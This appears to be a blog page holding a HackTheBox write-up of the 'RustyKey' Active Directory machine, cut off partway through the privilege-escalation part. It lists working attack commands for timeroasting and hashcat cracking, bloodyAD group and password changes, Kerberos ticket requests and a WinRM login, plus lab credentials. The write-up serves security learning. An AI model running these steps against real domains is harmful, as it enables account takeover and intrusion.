<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-HTB/RustyKey/index" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">RustyKey | My Site</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://Papalo007.github.io/writeups/img/therizzard.jpg"><meta data-rh="true" name="twitter:image" content="https://Papalo007.github.io/writeups/img/therizzard.jpg"><meta data-rh="true" property="og:url" content="https://Papalo007.github.io/writeups/docs/HTB/RustyKey"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="author" content="Papalo007"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="RustyKey | My Site"><meta data-rh="true" name="description" content="Full HackTheBox RustyKey machine walkthrough and exploitation steps."><meta data-rh="true" property="og:description" content="Full HackTheBox RustyKey machine walkthrough and exploitation steps."><meta data-rh="true" name="keywords" content="HTB,writeup,rustykey,walkthrough"><link data-rh="true" rel="icon" href="/writeups/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://Papalo007.github.io/writeups/docs/HTB/RustyKey"><link data-rh="true" rel="alternate" href="https://Papalo007.github.io/writeups/docs/HTB/RustyKey" hreflang="en"><link data-rh="true" rel="alternate" href="https://Papalo007.github.io/writeups/docs/HTB/RustyKey" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"RustyKey","item":"https://Papalo007.github.io/writeups/docs/HTB/RustyKey/"}]}</script><link rel="stylesheet" href="/writeups/assets/css/styles.3dd1818b.css">
<script src="/writeups/assets/js/runtime~main.bc97d4b2.js" defer="defer"></script>
<script src="/writeups/assets/js/main.451b45dc.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/writeups/assets/images/rustykeypfp-c931bc7459c9a6ef804922785200e4d6.png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/writeups/"><b class="navbar__title text--truncate">HTB Writeups</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/docs/HTB/RustyKey">Writeups</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/Papalo007" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="Search" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/writeups/docs/HTB/RustyKey"><span title="HTB" class="categoryLinkLabel_W154">HTB</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/docs/HTB/RustyKey"><span title="RustyKey" class="linkLabel_WmDU">RustyKey</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/docs/HTB/Gavel"><span title="ðŸ”’ Gavel (Active)" class="linkLabel_WmDU">ðŸ”’ Gavel (Active)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/docs/HTB/Fries"><span title="ðŸ”’ Fries (Active)" class="linkLabel_WmDU">ðŸ”’ Fries (Active)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/docs/HTB/Browsed"><span title="ðŸ”’ Browsed (Active)" class="linkLabel_WmDU">ðŸ”’ Browsed (Active)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/docs/HTB/AirTouch"><span title="ðŸ”’ AirTouch (Active)" class="linkLabel_WmDU">ðŸ”’ AirTouch (Active)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/docs/HTB/Overwatch"><span title="ðŸ”’ Overwatch (Active)" class="linkLabel_WmDU">ðŸ”’ Overwatch (Active)</span></a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/writeups/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HTB</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">RustyKey</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><img src="/writeups/assets/images/rustykeypfp-c931bc7459c9a6ef804922785200e4d6.png" alt="Profile" style="position:absolute;top:7.3rem;right:500px;width:96px;height:96px;border-radius:50%;z-index:1">
<header><h1>RustyKey</h1></header>
<p>Machine IP: 10.10.11.75</p>
<p>Difficulty: Hard, OS: Windows, Creator: <a href="https://app.hackthebox.com/users/962022" target="_blank" rel="noopener noreferrer" class="">EmSec</a></p>
<p>This is an assumed breach box so we have intial creds:</p>
<p><strong>User:</strong>  rr.parker</p>
<p><strong>Pass:</strong>  8#t5HE8L!W3A</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="user">User<a href="#user" class="hash-link" aria-label="Direct link to User" title="Direct link to User" translate="no">â€‹</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hash-link" aria-label="Direct link to Nmap Scan" title="Direct link to Nmap Scan" translate="no">â€‹</a></h3>
<p>We scan the target with nmap and get the following ports:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PORT     STATE SERVICE       VERSION                                                                   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">53/tcp   open  domain        Simple DNS Plus                                                           </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-18 02:08:49Z)            </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">135/tcp  open  msrpc         Microsoft Windows RPC                                                     </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)                                                                                  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">445/tcp  open  microsoft-ds?                                                                           </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">464/tcp  open  kpasswd5?                                                                               </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">636/tcp  open  tcpwrapped                                                                              </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)                                                                                  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3269/tcp open  tcpwrapped                                                                              </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|_http-title: Not Found                                                                                </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|_http-server-header: Microsoft-HTTPAPI/2.0                                                            </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows                                     </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                                                       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host script results:                                                                                   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| smb2-security-mode:                                                                                  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   3:1:1: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|_    Message signing enabled and required</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| smb2-time: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   date: 2025-11-18T02:08:56</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|_  start_date: N/A</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|_clock-skew: 8h00m00s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>From this output we can get the clock skew and the domain <strong>rustykey.htb</strong>, although it doesnâ€™t show us the FQDN. We add <strong>rustykey.htb</strong> to our <code>/etc/hosts</code> file, and if we run NetExec against SMB, we see that NTLM Authentication is disabled:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/HTB/Machines/Hard/Rustykey]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">â””â”€$ nxc smb 10.10.11.75 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) **(NTLM:False)**</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>We can also get the domain controller through ldap:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/HTB/Machines/Hard/Rustykey]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">â””â”€$ nxc ldap 10.10.11.75                                                           </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)</span><br></span></code></pre></div></div>
<p>NetExecâ€™s coerce check also finds a few potential vulnerabilities which may or may not prove useful:</p>
<p><img decoding="async" loading="lazy" alt="image.png" src="/writeups/assets/images/image-45b996ca72af602db40025883ec918c7.png" width="812" height="99" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="bloodhound">Bloodhound<a href="#bloodhound" class="hash-link" aria-label="Direct link to Bloodhound" title="Direct link to Bloodhound" translate="no">â€‹</a></h3>
<p>By looking at bloodhound, we see <strong>IT-Computer3</strong> has <strong>AddSelf</strong> to the <strong>Helpdesk</strong> group.</p>
<p><img decoding="async" loading="lazy" alt="image.png" src="/writeups/assets/images/image 1-9739d55f2d965e02d5f26723a03d7622.png" width="1224" height="310" class="img_ev3q"></p>
<p>Additionally, we can see that the password for this computer was last set 1 day after it was created. Computer objects automatically change their passwords every 30 days, so this one changing after one day means it is a user-set password, which makes it is weak.</p>
<p><img decoding="async" loading="lazy" alt="image.png" src="/writeups/assets/images/image 2-4245b03a4cb4efeaa9d1d8b04a6894a8.png" width="401" height="749" class="img_ev3q"></p>
<p>We can run a <strong>timeroast</strong> attack against computers which gives us the hash of their passwords. Since IT-Computer3â€™s password is user-set, it is therefore weak and could be potentially cracked.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="timeroasting">Timeroasting<a href="#timeroasting" class="hash-link" aria-label="Direct link to Timeroasting" title="Direct link to Timeroasting" translate="no">â€‹</a></h3>
<p>We run NetExecâ€™s timeroast module:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nxc smb dc.rustykey.htb -M timeroast  </span><br></span></code></pre></div></div>
<p>This gives us a bunch of hashes:</p>
<p><img decoding="async" loading="lazy" alt="image.png" src="/writeups/assets/images/image 3-64b932471762c5bf4b338c47c790353a.png" width="1786" height="450" class="img_ev3q"></p>
<p>We copy all of these into a timeroasthashes.txt file, which we then format properly using</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat timeroasthashes.txt | awk &#x27;{print $5}&#x27; &gt; t  # 5 since the hashes are the 5th field</span><br></span></code></pre></div></div>
<p>Now we can use hashcat to attempt to crack these</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat timeroasthashes.txt ~/Desktop/rockyou.txt --user </span><br></span></code></pre></div></div>
<p>And sure enough, we get a hit on RID 1125, which is IT-Computer3 whose pass is <strong><code>Rusty88!</code></strong></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="foothold">Foothold<a href="#foothold" class="hash-link" aria-label="Direct link to Foothold" title="Direct link to Foothold" translate="no">â€‹</a></h3>
<p>We now have new credentials. As we saw on bloodhound, IT-Computer3 can addSelf to Helpdesk.</p>
<p><img decoding="async" loading="lazy" alt="image.png" src="/writeups/assets/images/image 4-f1f0eb0acd02ac8cb692d5f8cd7da53d.png" width="1441" height="713" class="img_ev3q"></p>
<p>Helpdesk has a few outbound object controls. <strong>GG.ANDERSON</strong> is disabled, but the rest of the users are enabled.</p>
<p>Remote Management Users group: <strong>ee.reed, bb.morgan, gg.anderson (disabled)</strong></p>
<p>Letâ€™s first get into bb.morgan.</p>
<p>First, letâ€™s add ourselves to helpdesk:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bloodyAD -d rustykey.htb --host dc.rustykey.htb -u &#x27;IT-COMPUTER3$&#x27; -p &#x27;Rusty88!&#x27; -k \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add groupMember &#x27;Helpdesk&#x27; &#x27;IT-COMPUTER3$&#x27;</span><br></span></code></pre></div></div>
<p>Next, letâ€™s change bb.morganâ€™s pass:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bloodyAD -d rustykey.htb --host dc.rustykey.htb -u &#x27;IT-COMPUTER3$&#x27; -p &#x27;Rusty88!&#x27; -k \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set password &#x27;bb.morgan&#x27; &#x27;NewP@ss123&#x27; </span><br></span></code></pre></div></div>
<p>However, when trying to get a TGT we get this error:</p>
<p><img decoding="async" loading="lazy" alt="image.png" src="/writeups/assets/images/image 5-e040e9c87a277cbd8a20b6ebc922df90.png" width="901" height="106" class="img_ev3q"></p>
<p>If we take another look at bb.morganâ€™s groups, we see he is in Protected Objects (and so is ee.reed).</p>
<p>However, IT-Computer3$ could write to Protected Objects:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/HTB/Machines/Hard/Rustykey]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">â””â”€$ bloodyAD -d rustykey.htb --host dc.rustykey.htb -u &#x27;IT-COMPUTER3$&#x27; -p &#x27;Rusty88!&#x27; -k \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">get writable </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">distinguishedName: CN=TPM Devices,DC=rustykey,DC=htb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">permission: CREATE_CHILD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=rustykey,DC=htb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">permission: WRITE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">distinguishedName: CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">permission: CREATE_CHILD; WRITE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">**distinguishedName: CN=Protected Objects,CN=Users,DC=rustykey,DC=htb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">permission: WRITE**</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">distinguishedName: CN=dd.ali,OU=Users,OU=Finance,DC=rustykey,DC=htb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">permission: WRITE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>We see that bb.morgan is in the Protected Objects group because of IT, so we can remove IT from Protected Objects</p>
<p><img decoding="async" loading="lazy" alt="image.png" src="/writeups/assets/images/image 6-c3afbdc544b4f1ec682f5c4ea9f0eb9d.png" width="1268" height="536" class="img_ev3q"></p>
<p>We use bloodyAD:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/HTB/Machines/Hard/Rustykey]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">â””â”€$ bloodyAD -d rustykey.htb --host dc.rustykey.htb -u &#x27;IT-COMPUTER3$&#x27; -p &#x27;Rusty88!&#x27; -k \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">remove groupMember &#x27;Protected Objects&#x27; &#x27;IT&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] IT removed from Protected Objects</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>and this time getting the TGT works:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/HTB/Machines/Hard/Rustykey]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">â””â”€$ impacket-getTGT RUSTYKEY.HTB/&#x27;bb.morgan&#x27;:&#x27;NewP@ss123&#x27;                                                                     </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Saving ticket in bb.morgan.ccache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>From there we just set the KRB5CCNAME env variable to the ccache we got and connect through evil-winrm-py to get the user flag which is in the userâ€™s desktop.</p>
<p><code>evil-winrm-py -i dc.rustykey.htb -k</code></p>
<p>If we had worked with reed first, we wouldâ€™ve gotten into a roadblock after changing the password and removing her from Protected Objects, because we wouldnâ€™t be able to log in anywhere. Still not sure why..</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="privesc">PrivEsc<a href="#privesc" class="hash-link" aria-label="Direct link to PrivEsc" title="Direct link to PrivEsc" translate="no">â€‹</a></h2>
<p>Among the user flag, there is another file called <code>internal.pdf</code> . We download it and open it in our host. The pdf is an email from bb.morgan to the support team, and mentions something that looks important:</p>
<aside><p>ðŸ’¡</p><p>Some newer systems handle context menu actions differently, so registry-level adjustments are expected during this phase.</p></aside>
<p>Through the pdf, we learn that there have been some changes on zipping stuff (as it mentions compressing/extracting). Context menus, are COM objects, and they work with CLSIDs (Class Identifiers). COMs (Component Object Modules) are the thing that enables applications to share functionality. For example, you can open a zip file through explorer, and it treats it like a virtual folder. That works because there is a COM object that points to that type of file and uses that DLL so when another program tries to open it it uses that DLL in order to process it.</p>
<p>What does that mean for this case? Well for starters, we can query registries that have  CLSIDs in them:</p>
